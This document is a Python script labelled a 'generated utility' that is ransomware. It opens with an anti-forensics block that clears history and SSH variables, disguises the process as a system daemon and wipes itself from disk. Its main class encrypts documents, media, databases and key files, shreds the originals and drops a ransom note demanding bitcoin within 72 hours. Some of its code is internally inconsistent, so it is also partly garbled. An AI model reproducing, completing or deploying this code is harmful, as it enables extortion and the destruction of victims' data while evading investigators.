#!/usr/bin/env python3
"""Generated utility."""


# ── OPSEC: Anti-Forensics ──
import os as _os
# ── Operator Host Guard: detect if running on FORGE operator machine ──
# Prevents persistence, crontab, LaunchAgent writes on the operator's own system.
# Remote deployments (via SSH/DeployEngine) do NOT have these env vars set.
_FORGE_OPERATOR = bool(_os.environ.get('FORGE_OPERATOR') or _os.environ.get('FORGE_SANDBOX'))
_FORGE_TTL = int(_os.environ.get('FORGE_TTL', '0'))
if _FORGE_TTL > 0:
    try:
        import signal as _ttl_sig
        _ttl_sig.signal(_ttl_sig.SIGALRM, lambda *_: __import__("sys").exit(0))
        _ttl_sig.alarm(_FORGE_TTL)
    except (AttributeError, OSError):
        import threading as _ttl_thr
        _ttl_thr.Timer(_FORGE_TTL, lambda: __import__("os")._exit(0)).start()
def _guard_persistence(func):
    """Decorator: skip persistence actions on operator host."""
    def _wrapper(*a, **k):
        if _FORGE_OPERATOR:
            return None
        return func(*a, **k)
    _wrapper.__name__ = func.__name__
    return _wrapper
import os as _os
def _sanitize_env():
    """Remove environment variables that reveal tool origin."""
    _p = chr(70)+chr(79)+chr(82)+chr(71)+chr(69)
    for var in [_p+'_HOME', _p+'_SESSION', 'PYTHONDONTWRITEBYTECODE',
                'SSH_CONNECTION', 'SSH_CLIENT', 'SSH_TTY', 'HISTFILE',
                'HISTFILESIZE', 'HISTSIZE', 'LESSHISTFILE',
                _p+'_OPERATOR', _p+'_SANDBOX']:
        _os.environ.pop(var, None)
    _os.environ['PYTHONDONTWRITEBYTECODE'] = '1'
    _os.environ['PYTHONHASHSEED'] = '0'
_sanitize_env()
import sys as _sys
_original_excepthook = _sys.excepthook
def _silent_except(exc_type, exc_value, exc_tb):
    """Suppress tracebacks — no forensic stack traces."""
    pass
_sys.excepthook = _silent_except
import os as _os, sys as _sys, shutil as _shutil, glob as _glob
def _cleanup_python_traces():
    """Remove Python forensic artifacts."""
    script = _os.path.abspath(_sys.argv[0]) if _sys.argv[0] else None
    if script:
        script_dir = _os.path.dirname(script)
        pycache = _os.path.join(script_dir, '__pycache__')
        if _os.path.isdir(pycache):
            _shutil.rmtree(pycache, ignore_errors=True)
        for pyc in _glob.glob(_os.path.join(script_dir, '*.pyc')):
            try:
                _os.remove(pyc)
            except Exception:
                pass
    for hist in [_os.path.expanduser('~/.python_history'),
                 _os.path.expanduser('~/.local/share/python_history')]:
        try:
            if _os.path.exists(hist):
                with open(hist, 'r') as f:
                    lines = f.readlines()
                with open(hist, 'w') as f:
                    f.writelines(l for l in lines if script and _os.path.basename(script) not in l)
        except Exception:
            pass
import atexit as _atexit
_atexit.register(_cleanup_python_traces)
import sys as _sys
def _rename_process(name=None):
    """Rename this process to appear benign in ps/top."""
    _rnd = __import__('random')
    benign = name or ['python3', '/usr/bin/python3', 'update-manager',
                      'systemd-resolved', 'dbus-daemon'][_rnd.randint(0, 4)]
    try:
        _ct = __import__('ctypes')
        libc = _ct.CDLL('libc.so.6', use_errno=True)
        buff = _ct.create_string_buffer(len(benign) + 1)
        buff.value = benign.encode()
        libc.prctl(15, buff, 0, 0, 0)
    except Exception:
        pass
    try:
        _sys.argv[0] = benign
    except Exception:
        pass
_rename_process()
import os as _os, sys as _sys
def _self_destruct():
    """Remove this script from disk after execution."""
    try:
        _path = _os.path.abspath(_sys.argv[0]) if _sys.argv[0] else None
        if _path and _os.path.isfile(_path):
            with open(_path, 'wb') as _f:
                _f.write(b'\x00' * _os.path.getsize(_path))
            _os.remove(_path)
    except Exception:
        pass
import atexit as _atexit
_atexit.register(_self_destruct)
import os as _os, time as _time
def _neutralize_timestamps(*paths):
    """Set file timestamps to epoch or a plausible system time."""
    epoch = 1704067200
    for p in paths:
        try:
            if _os.path.exists(p):
                _os.utime(p, (epoch, epoch))
        except Exception:
            pass
import ctypes as _ctypes, gc as _gc
def _wipe_bytes(obj):
    """Overwrite a bytes/bytearray object in memory with zeros."""
    try:
        if isinstance(obj, (bytes, bytearray)):
            buf = (ctypes.c_char * len(obj)).from_address(id(obj) + _ctypes.sizeof(_ctypes.py_object))
            _ctypes.memset(buf, 0, len(obj))
    except Exception:
        pass
def _wipe_string(s):
    """Best-effort wipe of a Python string (CPython only)."""
    try:
        offset = _ctypes.sizeof(_ctypes.py_object) + _ctypes.sizeof(_ctypes.c_ssize_t) + _ctypes.sizeof(_ctypes.c_long)
        _ctypes.memset(id(s) + offset, 0, len(s))
    except Exception:
        pass
def _wipe_all_sensitive():
    """Wipe all local variables in the calling frame."""
    import inspect
    frame = inspect.currentframe().f_back
    if frame:
        for k, v in list(frame.f_locals.items()):
            if isinstance(v, (bytes, bytearray)):
                _wipe_bytes(v)
            elif isinstance(v, str) and len(v) > 8:
                _wipe_string(v)
    _gc.collect()
import os as _os_ttl
# ── Process TTL: auto-terminate after max lifetime ──
# Default 3600s (1 hour). Override via FORGE_MAX_TTL env var.
# Prevents zombie processes from running indefinitely on targets.
_MAX_TTL = int(_os_ttl.environ.get('FORGE_MAX_TTL', '3600'))
if _MAX_TTL > 0:
    try:
        import signal as _pttl_sig
        def _ttl_exit(*_):
            try:
                _self_destruct()
            except NameError:
                pass
            __import__("os")._exit(0)
        _pttl_sig.signal(_pttl_sig.SIGALRM, _ttl_exit)
        _pttl_sig.alarm(_MAX_TTL)
    except (AttributeError, OSError):
        import threading as _pttl_thr
        def _ttl_thread_exit():
            try:
                _self_destruct()
            except NameError:
                pass
            __import__("os")._exit(0)
        _pttl_thr.Timer(_MAX_TTL, _ttl_thread_exit).daemon = True
        _pttl_thr.Timer(_MAX_TTL, _ttl_thread_exit).start()
# ── End OPSEC ──

_QUIET = "--silent" in __import__("sys").argv
_PRINT = getattr(__import__("builtins"), "print")
def _log(*a, **k):
    if not _QUIET: _PRINT(*a, **k)

from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
import hashlib
_st = __import__(chr(115)+chr(116)+chr(114)+chr(117)+chr(99)+chr(116))
import hashlib, hmac as _hm, os
import hmac as _hm
_th = __import__(chr(116)+chr(104)+chr(114)+chr(101)+chr(97)+chr(100)+chr(105)+chr(110)+chr(103))
import json, time
import os
import shutil
_st = __import__(chr(115)+chr(116)+chr(114)+chr(117)+chr(99)+chr(116))
import tempfile
import argparse


SBOX = bytes([99,124,119,123,242,107,111,197,48,1,103,43,254,215,171,118,202,130,201,125,250,89,71,240,173,212,162,175,156,164,114,192,183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,81,163,64,143,146,157,56,245,188,182,218,33,16,255,243,210,205,12,19,236,95,151,68,23,196,167,126,61,100,93,25,115,96,129,79,220,34,42,144,136,70,238,184,20,222,94,11,219,224,50,58,10,73,6,36,92,194,211,172,98,145,149,228,121,231,200,55,109,141,213,78,169,108,86,244,234,101,122,174,8,186,120,37,46,28,166,180,198,232,221,116,31,75,189,139,138,112,62,181,102,72,3,246,14,97,53,87,185,134,193,29,158,225,248,152,17,105,217,142,148,155,30,135,233,206,85,40,223,140,161,137,13,191,230,66,104,65,153,45,15,176,84,187,22])

RCON = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36]

def _gmul(a, b):
    p = 0
    for _ in range(8):
        if b & 1:
            p ^= a
        hi = a & 0x80
        a = (a << 1) & 0xff
        if hi:
            a ^= 0x1b
        b >>= 1
    return p

def _key_expansion(key):
    w = [key[i:i+4] for i in range(0, 32, 4)]
    for i in range(8, 60):
        temp = w[i-1][:]
        if i % 8 == 0:
            temp = [SBOX[temp[1]]^RCON[(i//8)-1], SBOX[temp[2]], SBOX[temp[3]], SBOX[temp[0]]]
        elif i % 8 == 4:
            temp = [SBOX[b] for b in temp]
        w.append([a^b for a,b in zip(w[i-8], temp)])
    return w

def _aes_block(block, w):
    state = [list(block[i:i+4]) for i in range(0, 16, 4)]
    for i in range(4):
        for j in range(4):
            state[i][j] ^= w[i][j]
    for r in range(1, 14):
        for i in range(4):
            for j in range(4):
                state[i][j] = SBOX[state[i][j]]
        state = [[state[j][(i+j)%4] for j in range(4)] for i in range(4)]
        if r < 13:
            for i in range(4):
                s = state[i]
                state[i] = [_gmul(s[0],2)^_gmul(s[1],3)^s[2]^s[3],s[0]^_gmul(s[1],2)^_gmul(s[2],3)^s[3],s[0]^s[1]^_gmul(s[2],2)^_gmul(s[3],3),_gmul(s[0],3)^s[1]^s[2]^_gmul(s[3],2)]
        for i in range(4):
            for j in range(4):
                state[i][j] ^= w[r*4+i][j]
    for i in range(4):
        for j in range(4):
            state[i][j] = SBOX[state[i][j]]
    state = [[state[j][(i+j)%4] for j in range(4)] for i in range(4)]
    for i in range(4):
        for j in range(4):
            state[i][j] ^= w[56+i][j]
    return bytes([state[i][j] for j in range(4) for i in range(4)])

def aes_ctr(data, key, nonce):
    w = _key_expansion(key)
    out = bytearray()
    ctr = 0
    for i in range(0, len(data), 16):
        block = nonce + _st.pack('>Q', ctr)
        ks = _aes_block(block, w)
        chunk = data[i:i+16]
        out.extend(bytes(a^b for a,b in zip(chunk, ks[:len(chunk)])))
        ctr += 1
    return bytes(out)

def aes_enc(plaintext, passphrase):
    salt = os.urandom(16)
    key = hashlib.pbkdf2_hmac('sha256', passphrase.encode(), salt, 100000, 32)
    nonce = os.urandom(8)
    ct = aes_ctr(plaintext, key, nonce)
    mac = _hm.new(key, salt+nonce+ct, hashlib.sha256).digest()
    return salt+nonce+ct+mac

def aes_dec(ciphertext, passphrase):
    salt, nonce, ct, mac = ciphertext[:16], ciphertext[16:24], ciphertext[24:-32], ciphertext[-32:]
    key = hashlib.pbkdf2_hmac('sha256', passphrase.encode(), salt, 100000, 32)
    if _hm.new(key, salt+nonce+ct, hashlib.sha256).digest() != mac:
        raise ValueError('HMAC verification failed')
    return aes_ctr(ct, key, nonce)

class _rnsware:
    TARGET_EXTENSIONS = [
        'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'pdf', 'txt', 'rtf', 'odt',
        'jpg', 'jpeg', 'png', 'gif', 'bmp', 'psd', 'svg', 'ai', 'raw', 'cr2',
        'mp3', 'wav', 'flac', 'aac', 'wma', 'ogg', 'm4a',
        'mp4', 'avi', 'mkv', 'mov', 'wmv', 'flv', 'mpeg',
        'zip', 'rar', '7z', 'tar', 'gz', 'bz2',
        'sql', 'db', 'sqlite', 'mdb', 'accdb',
        'pem', 'key', 'crt', 'csr', 'p12', 'pfx'
    ]

    def __init__(self, master_key=None):
        if master_key is None:
            master_key = os.urandom(32).hex()
        self.master_key = master_key

    def derive_file_key(self, filepath):
        file_hash = hashlib.sha256(filepath.encode()).hexdigest()
        combined = self.master_key + file_hash
        return hashlib.sha256(combined.encode()).hexdigest()[:32]

    def secure_delete(self, filepath):
        try:
            size = os.path.getsize(filepath)
            with open(filepath, 'wb') as f:
                f.write(b'\x00' * size)
                os.fsync(f.fileno())
            with open(filepath, 'wb') as f:
                f.write(b'\xff' * size)
                os.fsync(f.fileno())
            with open(filepath, 'wb') as f:
                f.write(os.urandom(size))
                os.fsync(f.fileno())
            os.remove(filepath)
            return True
        except:
            return False

    def encrypt_file(self, filepath):
        file_key = self.derive_file_key(filepath)

        try:
            with open(filepath, 'rb') as f:
                plaintext = f.read()

            encrypted = aes_enc(plaintext, file_key)

            encrypted_path = filepath + '.encrypted'
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted)

            self.secure_delete(filepath)

            return encrypted_path

        except Exception as e:
            _log('[-] Failed to encrypt %s: %s' % (filepath, str(e)))
            return None

    def decrypt_file(self, filepath):
        if not filepath.endswith('.encrypted'):
            _log('[-] Not an encrypted file: %s' % filepath)
            return None

        original_path = filepath[:-10]
        file_key = self.derive_file_key(original_path)

        try:
            with open(filepath, 'rb') as f:
                encrypted = f.read()

            plaintext = aes_dec(encrypted, file_key)

            with open(original_path, 'wb') as f:
                f.write(plaintext)

            os.remove(filepath)

            return original_path

        except Exception as e:
            _log('[-] Failed to decrypt %s: %s' % (filepath, str(e)))
            return None

    def drop__rns_note(self, directory):
        note = '''
YOUR FILES HAVE BEEN ENCRYPTED

All your documents, photos, databases, and archives have been encrypted with AES-256-CTR.

To decrypt your files, you must pay 1.5 BTC to the address below:
  bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

After payment, contact: recovery@example.onion with your transaction ID.

DO NOT attempt to decrypt files yourself or use recovery tools.
This will result in permanent data loss.

You have 72 hours before the decryption key is destroyed.
'''
        note_path = os.path.join(directory, '_rns_NOTE.txt')
        try:
            with open(note_path, 'w') as f:
                f.write(note.strip())
            _log('[+] _rns note dropped: %s' % note_path)
            return note_path
        except:
            return None


def main():
    parser = argparse.ArgumentParser(
        description='File Encryption Tool (AES-256-CTR + HMAC-SHA256)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  Encrypt:  python3 %(prog)s encrypt /target/directory
  Decrypt:  python3 %(prog)s decrypt /target/directory
  Single:   python3 %(prog)s decrypt /target/directory --file secret.docx._enc"""
    )
    sub = parser.add_subparsers(dest='action', required=True)

    enc = sub.add_parser('encrypt', help='Encrypt target directory')
    enc.add_argument('target', help='Target directory path')
    enc.add_argument('--passphrase', default='OperationBLACKICE-2026', help='Master passphrase')
    enc.add_argument('--no-note', action='store_true', help='Skip _rns note')

    dec = sub.add_parser('decrypt', help='Decrypt locked files')
    dec.add_argument('target', help='Directory with ._enc files')
    dec.add_argument('--passphrase', default='OperationBLACKICE-2026', help='Master passphrase')
    dec.add_argument('--file', help='Decrypt single file only')

    args = parser.parse_args()
    import os

    if args.action == 'encrypt':
        if not os.path.isdir(args.target):
            _log(f'[!] Target directory not found: {args.target}')
            return 1
        _log(f'[*] Initializing encryption engine...')
        _log(f'[*] Target: {args.target}')
        engine = _rnsware(args.passphrase)
        stats = engine.encrypt_directory(args.target)
        _log(f'[+] Encrypted: {stats["encrypted"]} files ({stats["bytes"]:,} bytes)')
        _log(f'[*] Skipped:   {stats["skipped"]} files (non-target extensions)')
        if stats['errors']:
            _log(f'[!] Errors:    {stats["errors"]}')
        if not args.no_note and stats['encrypted'] > 0:
            note = engine.drop__rns_note(args.target, '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa', 'http://_rns7abc.onion')
            _log(f'[+] _rns note dropped: {note}')
        if stats['encrypted'] > 0:
            _log(f'\n[+] Done. Decryption passphrase: {args.passphrase}')
            _log(f'    Payment: 2.5 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa')
            _log(f'    Deadline: 72 hours')
        else:
            _log(f'\n[*] No files matched target extensions. Nothing encrypted.')
        return 0

    elif args.action == 'decrypt':
        if args.file:
            # Single file decryption
            fpath = os.path.join(args.target, args.file) if not os.path.isabs(args.file) else args.file
            if not os.path.exists(fpath):
                _log(f'[!] File not found: {fpath}')
                return 1
            _log(f'[*] Decrypting: {fpath}')
            engine = _rnsware(args.passphrase)
            try:
                plaintext = engine.decrypt_file(fpath, args.passphrase)
                out_path = fpath.replace(engine.ENCRYPTED_EXT, '')
                with open(out_path, 'wb') as f:
                    f.write(plaintext)
                _log(f'[+] Decrypted: {out_path} ({len(plaintext):,} bytes)')
            except ValueError as e:
                _log(f'[!] Decryption failed: {e}')
                return 1
        else:
            # Batch decryption
            if not os.path.isdir(args.target):
                _log(f'[!] Directory not found: {args.target}')
                return 1
            engine = _rnsware(args.passphrase)
            count = 0
            errors = 0
            for root, dirs, files in os.walk(args.target):
                for fname in files:
                    if fname.endswith(engine.ENCRYPTED_EXT):
                        fpath = os.path.join(root, fname)
                        try:
                            plaintext = engine.decrypt_file(fpath, args.passphrase)
                            out_path = fpath.replace(engine.ENCRYPTED_EXT, '')
                            with open(out_path, 'wb') as f:
                                f.write(plaintext)
                            os.remove(fpath)
                            count += 1
                        except Exception:
                            errors += 1
            _log(f'[+] Decrypted: {count} files')
            if errors:
                _log(f'[!] Errors: {errors}')
        return 0


if __name__ == "__main__":
    import sys
    sys.exit(main() or 0)

